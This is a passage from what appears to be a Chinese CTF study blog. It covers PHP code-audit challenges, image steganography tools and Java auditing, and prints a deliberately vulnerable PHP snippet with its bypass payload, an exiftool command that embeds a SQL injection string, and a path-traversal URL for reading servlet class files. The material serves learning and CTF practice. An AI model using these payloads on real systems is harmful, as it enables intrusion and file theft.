class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-2-朴实无华Revenge-2-0"><a href="#2-2-朴实无华Revenge-2-0" class="headerlink" title="2.2  朴实无华Revenge 2.0"></a><strong>2.2  朴实无华Revenge 2.0</strong></h2><p> <strong>考点：</strong>is_numeric + \f</p><p><strong>参考链接：</strong></p><p><strong>1、</strong>PHP代码审计<code>(绕过过滤的空白字符)</code>  <a href="https://blog.csdn.net/qq_36609913/article/details/79296052" target="_blank" rel="noopener">https://blog.csdn.net/qq_36609913/article/details/79296052</a></p><p>这道题和上面y1ng大佬出的那道题很像，内部考察的则是另外一套知识点，本地phpstorm+xdebug调试收获很多。</p><p><strong>思路：</strong></p><p>get形式传参<code>$number</code>，<code>&quot;number&quot;</code>作为数组$req的键名，<code>$number</code>的值经<code>trim</code>处理后作为键值赋给数组<code>$req</code>。</p><p>is_numeric要求传入的<code>$number</code>不能是数字型字符串，此处可用%00截断，绕过判断。</p><p><code>$req[&#39;number&#39;]!=strval(intval($req[&#39;number&#39;]))</code>要求数组$req的值与其取整后的值弱相等，intval会忽略\f。</p><p>最后要求数组<code>$req</code>取整后的键值与其取反后再取整的键值相等，但其键值又不能是回文。这里因为数组<code>$req</code>的键值被trim处理过，所以不能用%0a,%0b，这些不可见字符会被trim过滤，用%0c也就是\f就可以了，从而达到不是回文，但取整又相等的目的。</p><p><img src="/2020/05/09/best-codereview/3.png" alt="Revenge 2.0"></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$info</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$req</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_error"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//为一个配置选项设置值</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//关闭所有PHP错误报告</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"hint:26966dc52e85af40f59b4fe73d8c323a.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"have a fun!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//die — 等同于 exit()</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$global_var</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//foreach 语法结构提供了遍历数组的简单方式</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$global_var</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//trim — 去除字符串首尾处的空白字符（或者其他字符）</span>        <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$req</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">is_palindrome_number</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$number</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//strval — 获取变量的字符串值</span>    <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token variable">$j</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//strlen — 获取字符串长度</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$j</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$number</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//is_numeric — 检测变量是否为数字或数字字符串</span><span class="token punctuation">{</span>    <span class="token variable">$info</span><span class="token operator">=</span><span class="token string">"sorry, you cann't input a number!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">'number'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">'number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//intval — 获取变量的整数值</span><span class="token punctuation">{</span>    <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token string">"number must be equal to it's integer!! "</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$value1</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">"number"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$value2</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">"number"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value1</span><span class="token operator">!=</span><span class="token variable">$value2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$info</span><span class="token operator">=</span><span class="token string">"no, this is not a palindrome number!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_palindrome_number</span><span class="token punctuation">(</span><span class="token variable">$req</span><span class="token punctuation">[</span><span class="token string">"number"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token string">"nice! {$value1} is a palindrome number!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token variable">$info</span><span class="token operator">=</span><span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token variable">$info</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payload：</strong></p><pre><code>?number=%00%0c131</code></pre><h2 id="2-3-easy-game"><a href="#2-3-easy-game" class="headerlink" title="2.3  easy_game"></a>2.3  easy_game</h2><p><strong>考点：</strong>代码审计 + 反序列化 + sql注入</p><p><strong>参考资料：</strong></p><p><strong>0、</strong>SWPU CTF 2017 Web WriteUp（非常详细）  <a href="https://blog.csdn.net/vspiders/article/details/78510579?readlog" target="_blank" rel="noopener">https://blog.csdn.net/vspiders/article/details/78510579?readlog</a></p><p><strong>1、</strong>%00截断配合反序列化的奇妙利用  <a href="https://www.codercto.com/a/63196.html" target="_blank" rel="noopener">https://www.codercto.com/a/63196.html</a></p><p><strong>2、</strong>swpu第八届网络安全大赛Writeup  <a href="https://www.secpulse.com/archives/65568.html（payload" target="_blank" rel="noopener">https://www.secpulse.com/archives/65568.html（payload</a> here！！）</p><p><strong>3、</strong>Mochazz’s blog  <a href="https://mochazz.github.io/2017/12/04/08067CTF/#%E6%88%91%E4%BB%AC%E6%9D%A5%E5%81%9A%E4%B8%AA%E5%B0%8F%E6%B8%B8%E6%88%8F%E5%90%A7" target="_blank" rel="noopener">https://mochazz.github.io/2017/12/04/08067CTF/#%E6%88%91%E4%BB%AC%E6%9D%A5%E5%81%9A%E4%B8%AA%E5%B0%8F%E6%B8%B8%E6%88%8F%E5%90%A7</a></p><p><strong>4、</strong>SWPUCTF web writeup  <a href="https://www.colabug.com/2017/1105/1825075/" target="_blank" rel="noopener">https://www.colabug.com/2017/1105/1825075/</a></p><p><strong>5、</strong>2017swpu-ctf总结  <a href="https://www.cnblogs.com/wangshuwin/p/7836711.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangshuwin/p/7836711.html</a></p><p>这道题考察很综合，但苦于没有复现环境，于是就想把这道题做一个镜像。</p><h1 id="3-参考资料"><a href="#3-参考资料" class="headerlink" title="3.  参考资料"></a>3.  参考资料</h1><p><strong>1、</strong>浅谈代码审计入门实战：某博客系统最新版审计之旅  <a href="https://www.freebuf.com/news/143554.html" target="_blank" rel="noopener">https://www.freebuf.com/news/143554.html</a></p><p><strong>2、</strong>审计系列：<a href="https://www.cnblogs.com/pojun/p/7354916.html" target="_blank" rel="noopener">https://www.cnblogs.com/pojun/p/7354916.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF_WEB </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>best_MISC</title>
      <link href="/2020/05/08/best-misc/"/>
      <url>/2020/05/08/best-misc/</url>
      
        <content type="html"><![CDATA[<h1 id="1-picture"><a href="#1-picture" class="headerlink" title="1.  picture"></a>1.  picture</h1><h2 id="1-1-instrument"><a href="#1-1-instrument" class="headerlink" title="1.1  instrument"></a>1.1  instrument</h2><h3 id="1-1-1-exiftool工具"><a href="#1-1-1-exiftool工具" class="headerlink" title="1.1.1  exiftool工具"></a>1.1.1  exiftool工具</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong>图片EXIF信息查看与Exiftool使用  <a href="https://www.jianshu.com/p/d76457799de1" target="_blank" rel="noopener">https://www.jianshu.com/p/d76457799de1</a></p><p>用于更新<strong>图片exif</strong>信息</p><p><strong>payload:</strong></p><pre><code>exiftool -overwrite_original -comment=&quot;y1ng\&quot;&#39;);select if(1,sleep(20),sleep(20));--+&quot; y1ng.jpg</code></pre><p><img src="/2020/05/08/best-misc/1.png" alt="exiftool"></p><p><strong>图虫查看器：</strong><a href="https://exif.tuchong.com/" target="_blank" rel="noopener">https://exif.tuchong.com/</a></p><p><img src="/2020/05/08/best-misc/2.png" alt="exif"></p><h3 id="1-1-2-zsteg"><a href="#1-1-2-zsteg" class="headerlink" title="1.1.2  zsteg"></a>1.1.2  zsteg</h3><h3 id="1-1-3-tweakpng"><a href="#1-1-3-tweakpng" class="headerlink" title="1.1.3  tweakpng"></a>1.1.3  tweakpng</h3><p>这个工具可以查看图片的crc32值。</p><h2 id="1-2-trick"><a href="#1-2-trick" class="headerlink" title="1.2  trick"></a>1.2  trick</h2><h3 id="1-2-1-高度隐写"><a href="#1-2-1-高度隐写" class="headerlink" title="1.2.1  高度隐写"></a>1.2.1  高度隐写</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token comment" spellcheck="true">#python3</span><span class="token keyword">import</span> zlib<span class="token keyword">import</span> struct<span class="token comment" spellcheck="true">#读文件</span>file <span class="token operator">=</span> <span class="token string">'1.png'</span> fr <span class="token operator">=</span> open<span class="token punctuation">(</span>file<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>fr<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">)</span>crc32key <span class="token operator">=</span> <span class="token number">0x75da3b3c</span>n <span class="token operator">=</span> <span class="token number">4095</span> <span class="token comment" spellcheck="true">#理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了</span><span class="token keyword">for</span> w <span class="token keyword">in</span> range<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#高和宽一起爆破</span>    width <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>i'</span><span class="token punctuation">,</span> w<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#q为8字节，i为4字节，h为2字节</span>    <span class="token keyword">for</span> h <span class="token keyword">in</span> range<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        height <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>i'</span><span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            data<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> width<span class="token punctuation">[</span>x<span class="token punctuation">]</span>            data<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> height<span class="token punctuation">[</span>x<span class="token punctuation">]</span>            <span class="token comment" spellcheck="true">#print(data)</span>        crc32result <span class="token operator">=</span> zlib<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> crc32result <span class="token operator">==</span> crc32key<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>width<span class="token punctuation">,</span>height<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#写文件</span>            newpic <span class="token operator">=</span> bytearray<span class="token punctuation">(</span>fr<span class="token punctuation">)</span>            <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                newpic<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> width<span class="token punctuation">[</span>x<span class="token punctuation">]</span>                newpic<span class="token punctuation">[</span>x<span class="token operator">+</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> height<span class="token punctuation">[</span>x<span class="token punctuation">]</span>            fw <span class="token operator">=</span> open<span class="token punctuation">(</span>file<span class="token operator">+</span><span class="token string">'.png'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#保存副本</span>            fw<span class="token punctuation">.</span>write<span class="token punctuation">(</span>newpic<span class="token punctuation">)</span>            fw<span class="token punctuation">.</span>close            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-2-2-lsb隐写"><a href="#1-2-2-lsb隐写" class="headerlink" title="1.2.2  lsb隐写"></a><strong>1.2.2  lsb隐写</strong></h3><h1 id="2-压缩包"><a href="#2-压缩包" class="headerlink" title="2.  压缩包"></a>2.  压缩包</h1><h2 id="2-1-instrument"><a href="#2-1-instrument" class="headerlink" title="2.1  instrument"></a>2.1  instrument</h2><h3 id="2-1-1-Archive-Password-Recovery"><a href="#2-1-1-Archive-Password-Recovery" class="headerlink" title="2.1.1  Archive Password Recovery"></a>2.1.1  Archive Password Recovery</h3>]]></content>
      
      
      <categories>
          
          <category> CTF_MISC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>best_java</title>
      <link href="/2020/05/08/best-java/"/>
      <url>/2020/05/08/best-java/</url>
      
        <content type="html"><![CDATA[<h1 id="1-java代码审计基础"><a href="#1-java代码审计基础" class="headerlink" title="1.  java代码审计基础"></a>1.  java代码审计基础</h1><p>本菜鸡用code Runner插件来运行java程序，后面逐步学习怎么调试吧。</p><h2 id="1-1-instrument"><a href="#1-1-instrument" class="headerlink" title="1.1  instrument"></a>1.1  instrument</h2><h3 id="1-1-1-jd-gui"><a href="#1-1-1-jd-gui" class="headerlink" title="1.1.1  jd-gui"></a>1.1.1  jd-gui</h3><p>资源链接：<a href="https://www.cr173.com/soft/1096707.html" target="_blank" rel="noopener">https://www.cr173.com/soft/1096707.html</a></p><p> JD-GUI是一个独立的图形实用程序，显示<code>&quot;.class&quot;</code>文件的Java源代码。 </p><h1 id="2-java代码审计进阶"><a href="#2-java代码审计进阶" class="headerlink" title="2.  java代码审计进阶"></a>2.  java代码审计进阶</h1><h1 id="3-真题"><a href="#3-真题" class="headerlink" title="3.  真题"></a>3.  真题</h1><h2 id="3-1-filejava-（2020网鼎杯-青龙组）"><a href="#3-1-filejava-（2020网鼎杯-青龙组）" class="headerlink" title="3.1  filejava  （2020网鼎杯-青龙组）"></a>3.1  filejava  <code>（2020网鼎杯-青龙组）</code></h2><p><strong>考点：</strong> Servlet + Jsp </p><p><strong>参考资料：</strong>  </p><p><strong>1、</strong>2020网鼎杯—Java文件上传wp  <a href="https://samny.blog.csdn.net/article/details/106038576" target="_blank" rel="noopener">https://samny.blog.csdn.net/article/details/106038576</a></p><p><strong>2、</strong>网鼎杯青龙组部分web-wp（我终于读到文件了）  <a href="https://www.cnblogs.com/h3zh1/p/12868014.html" target="_blank" rel="noopener">https://www.cnblogs.com/h3zh1/p/12868014.html</a></p><p><strong>3、</strong><a href="https://www.gem-love.com/websecurity/2322.html" target="_blank" rel="noopener">https://www.gem-love.com/websecurity/2322.html</a></p><p><strong>4、</strong> 利用EXCEL进行XXE攻击   <a href="https://xz.aliyun.com/t/3741" target="_blank" rel="noopener">https://xz.aliyun.com/t/3741</a></p><h3 id="3-1-1-读取路径"><a href="#3-1-1-读取路径" class="headerlink" title="3.1.1  读取路径"></a>3.1.1  读取路径</h3><p>上传的时候文件名写为<code>&lt;h&gt;66&lt;/h&gt;.jsp</code>，爆出路径：</p><p><code>&amp;#47;</code>是斜杠</p><p><img src="/2020/05/08/best-java/1.png" alt="path"></p><pre><code>按照下面这个格式，根据web.xml读取.class文件，不要用burpsuite，直接在浏览器的地方读。?filename=../../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class</code></pre><h1 id="4-参考资料"><a href="#4-参考资料" class="headerlink" title="4.  参考资料"></a>4.  参考资料</h1><h2 id="java安装及环境配置"><a href="#java安装及环境配置" class="headerlink" title="java安装及环境配置"></a>java安装及环境配置</h2><p>java安装教程  <a href="https://www.cnblogs.com/maoning/p/10701349.html" target="_blank" rel="noopener">https://www.cnblogs.com/maoning/p/10701349.html</a></p><p>VSCode搭建Java开发运行环境<a href="https://www.cnblogs.com/zhaoshizi/p/9524421.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaoshizi/p/9524421.html</a></p><p>Java0基础教程——java的安装  <a href="https://baijiahao.baidu.com/s?id=1663052426967346638&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">https://baijiahao.baidu.com/s?id=1663052426967346638&amp;wfr=spider&amp;for=pc</a></p><p>利用VS code运行java  <a href="https://blog.csdn.net/qq_42364543/article/details/99696066" target="_blank" rel="noopener">https://blog.csdn.net/qq_42364543/article/details/99696066</a></p><h2 id="JAVA学习资料"><a href="#JAVA学习资料" class="headerlink" title="JAVA学习资料"></a>JAVA学习资料</h2><p>Java 代码审计入门-01]审计前的准备  <a href="https://www.cnpanda.net/codeaudit/588.html" target="_blank" rel="noopener">https://www.cnpanda.net/codeaudit/588.html</a></p><p>Java代码审计之入门篇（一） <a href="https://www.anquanke.com/post/id/197641" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197641</a></p><p>Java 代码审计入门-02]SQL 漏洞原理与实际案例介绍  <a href="https://xz.aliyun.com/t/6872#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/6872#toc-12</a></p><p>Java 代码审计入门-03]XSS 漏洞原理与实际案例介绍  <a href="https://xz.aliyun.com/t/6937" target="_blank" rel="noopener">https://xz.aliyun.com/t/6937</a></p><p>Java 代码审计入门-04]SSRF 漏洞原理与实际案例介绍  <a href="https://xz.aliyun.com/t/7186" target="_blank" rel="noopener">https://xz.aliyun.com/t/7186</a></p><p>Java Web安全之代码审计  <a href="https://www.freebuf.com/articles/web/194836.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/194836.html</a></p><p>Java 代码审计整理（持续更新…） <a href="http://blog.thinsad.com/index.php/archives/29.html" target="_blank" rel="noopener">http://blog.thinsad.com/index.php/archives/29.html</a></p><p>java代码审计-铁人下载系统  <a href="https://landgrey.me/static/upload/2019-09-15/opwgtvha.pdf" target="_blank" rel="noopener">https://landgrey.me/static/upload/2019-09-15/opwgtvha.pdf</a></p><p>javasec  <a href="https://javasec.org/" target="_blank" rel="noopener">https://javasec.org/</a></p><p>JavaWeb学习总结  <a href="https://www.cnblogs.com/xdp-gacl/category/574705.html" target="_blank" rel="noopener">https://www.cnblogs.com/xdp-gacl/category/574705.html</a></p><p>java代码审计文章集合  <a href="https://www.cnblogs.com/r00tuser/p/10577571.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/10577571.html</a></p><p>某租车系统JAVA代码审计前台sql注入  <a href="https://www.cnblogs.com/r00tuser/p/9708911.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/9708911.html</a></p><p>Java Web安全-代码审计（一）  <a href="https://mp.weixin.qq.com/s?__biz=MzU5Mzc4MTIyNw==&amp;mid=2247483708&amp;idx=1&amp;sn=1cb0c0a246529f5436c601df206a2254&amp;chksm=fe0a09b8c97d80ae9e21fb19c930336556f2d5e094c260064fa753f4ce54ae6727c3f184e0ba&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU5Mzc4MTIyNw==&amp;mid=2247483708&amp;idx=1&amp;sn=1cb0c0a246529f5436c601df206a2254&amp;chksm=fe0a09b8c97d80ae9e21fb19c930336556f2d5e094c260064fa753f4ce54ae6727c3f184e0ba&amp;scene=21#wechat_redirect</a></p><p>Java Web安全-代码审计（二）  <a href="https://mp.weixin.qq.com/s?__biz=MzU5Mzc4MTIyNw==&amp;mid=2247483740&amp;idx=1&amp;sn=ca216f697e1f5e05fbeeb2130f1eca4c&amp;chksm=fe0a09d8c97d80cea838fe348d844acbcaec351e6d9b86f08bab49193b1aa72580cd3f2b09e6&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU5Mzc4MTIyNw==&amp;mid=2247483740&amp;idx=1&amp;sn=ca216f697e1f5e05fbeeb2130f1eca4c&amp;chksm=fe0a09d8c97d80cea838fe348d844acbcaec351e6d9b86f08bab49193b1aa72580cd3f2b09e6&amp;scene=21#wechat_redirect</a></p><p>Java Web安全-代码审计（三）  <a href="https://mp.weixin.qq.com/s/sMLVaYtlBPaHuiU-Sboopg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/sMLVaYtlBPaHuiU-Sboopg</a></p><p>java代码审计手书  <a href="https://xz.aliyun.com/search?keyword=java代码审计手书" target="_blank" rel="noopener">https://xz.aliyun.com/search?keyword=java代码审计手书</a></p><p>JavaEE论坛2.0审计记录  <a href="http://www.liuhaihua.cn/archives/535976.html" target="_blank" rel="noopener">http://www.liuhaihua.cn/archives/535976.html</a></p><p>Exploiting JNDI Injections in Java  <a href="https://xz.aliyun.com/t/3787" target="_blank" rel="noopener">https://xz.aliyun.com/t/3787</a></p><p>基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI  <a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">https://xz.aliyun.com/t/7079</a></p><p>浅谈Java RMI 反序列化安全问题  <a href="https://www.anquanke.com/post/id/197829" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197829</a></p><p>JAVA安全编码与代码审计  <a href="https://github.com/Cryin/Paper/blob/master/JAVA安全编码与代码审计.md" target="_blank" rel="noopener">https://github.com/Cryin/Paper/blob/master/JAVA安全编码与代码审计.md</a></p><p>【技术分享】关于 JNDI 注入  <a href="https://www.anquanke.com/post/id/87031" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87031</a></p><p>tr1ple博客java安全分类  <a href="https://www.cnblogs.com/tr1ple/category/1534280.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/category/1534280.html</a></p><p>Java 反射由浅入深 | 进阶必备  <a href="https://juejin.im/post/598ea9116fb9a03c335a99a4" target="_blank" rel="noopener">https://juejin.im/post/598ea9116fb9a03c335a99a4</a></p><p>在 Runtime.getRuntime .exec String cmd 中执行任意shell命令的几种方法  <a href="https://mp.weixin.qq.com/s/zCe_O37rdRqgN-Yvlq1FDg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/zCe_O37rdRqgN-Yvlq1FDg</a></p><p>sec-News的java分类  <a href="http://wiki.ioin.in/search/page-7?word=java+notintitle%3Ascript" target="_blank" rel="noopener">http://wiki.ioin.in/search/page-7?word=java+notintitle%3Ascript</a></p><p>Java“后反序列化漏洞”利用思路  <a href="http://rui0.cn/archives/1338" target="_blank" rel="noopener">http://rui0.cn/archives/1338</a></p><p>基于内存 Webshell 的无文件攻击技术研究  <a href="https://www.anquanke.com/post/id/198886" target="_blank" rel="noopener">https://www.anquanke.com/post/id/198886</a></p><p>一篇文章读懂Java代码审计之XXE  <a href="https://xz.aliyun.com/t/7272#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7272#toc-10</a></p><p>搞懂RMI、JRMP、JNDI-终结篇  <a href="https://xz.aliyun.com/t/7264#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/7264#toc-0</a></p><p>JNDI with RMI  